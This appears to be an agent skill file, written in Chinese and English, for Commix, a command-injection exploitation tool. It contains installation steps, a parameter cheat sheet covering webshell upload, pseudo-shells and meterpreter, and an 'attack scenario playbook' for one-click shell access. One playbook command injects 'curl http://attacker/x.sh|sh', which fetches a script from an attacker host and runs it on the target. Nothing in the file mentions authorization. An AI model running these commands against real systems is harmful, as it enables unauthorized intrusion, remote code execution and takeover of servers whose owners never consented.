---
name: commix-command-injection
description: "Commix: Automates command injection exploitation and Burp request replay. Signals: web vulnerability, injection, automatic command injection detection and exploitation, POST data."
zh-signals: "Commix: 命令注入一键 getshell、burp 请求回放利用。信号:web漏洞,注入,自动检测+利用命令注入,POST 数据。"
---

# Commix

- 攻击大类:C09 Web应用漏洞利用
- 上游仓库:https://github.com/commixproject/commix
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/commixproject/commix && cd commix
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python commix.py -u 'https://t.com/page.php?id=1'` | 自动检测+利用命令注入 |
| `--data='id=1'` | POST 数据 |
| `--os-cmd='whoami'` | 直接命令 |
| `--shell` | 伪终端 |
| `--level=3` | 测试深度 |
| `--technique=C` | 只测经典注入 |
| `-r request.txt` | burp 请求 |
| `--batch` | 非交互 |
| `--file-upload=shell.php` | 上传 webshell |
| `--os-pwn` | meterpreter 化 |

## 攻击场景 Playbook

### 命令注入一键 getshell

```bash
python commix.py -u 'https://target/ping.php?host=127.0.0.1' --batch
python commix.py -u 'https://target/ping.php' --data='host=1' --os-cmd='curl http://attacker/x.sh|sh'
```

### burp 请求回放利用

```bash
python commix.py -r req.txt --level=2 --technique=C
```

## 注意事项

'命令注入版 sqlmap';支持伪终端/文件上传/反向连接;--level 越高测试越全但越慢。
